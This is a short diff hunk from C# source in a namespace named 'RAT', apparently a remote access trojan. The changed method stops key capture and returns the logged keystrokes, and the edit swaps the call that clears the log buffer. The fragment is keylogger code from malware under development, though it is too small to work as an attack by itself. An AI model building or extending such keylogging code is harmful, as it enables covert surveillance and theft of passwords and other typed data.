@@ -89,7 +89,7 @@ namespace RAT
         {
             running = false;
             string capturedKeys = Log.ToString();
-            Log.Clear();
+            Log.Remove(0, Log.Length);
             return capturedKeys;
         }
     }
